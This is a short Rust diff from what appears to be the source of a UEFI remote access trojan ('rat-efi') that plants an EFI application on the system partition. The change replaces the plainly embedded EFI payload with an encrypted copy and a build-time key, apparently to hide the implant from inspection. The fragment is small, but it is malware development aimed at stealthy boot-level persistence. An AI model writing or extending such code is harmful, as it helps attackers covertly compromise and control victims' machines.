@@ -7,10 +7,7 @@ pub const ESP_GUID: GUID = GUID {
     data4: [0xBA, 0x4B, 0x00, 0xA0, 0xC9, 0x3E, 0xC9, 0x3B],
 };
 
-#[cfg(debug_assertions)]
-pub const EFI_APPLICATION: &[u8] =
-    include_bytes!("../../rat-efi/target/x86_64-unknown-uefi/debug/rat-efi.efi");
+include!(concat!(env!("OUT_DIR"), "/key.rs"));
 
-#[cfg(not(debug_assertions))]
-pub const EFI_APPLICATION: &[u8] =
-    include_bytes!("../../rat-efi/target/x86_64-unknown-uefi/release/rat-efi.efi");
+pub const EFI_APPLICATION_ENCRYPTED: &[u8] =
+    include_bytes!(concat!(env!("OUT_DIR"), "/embedded.efi"));
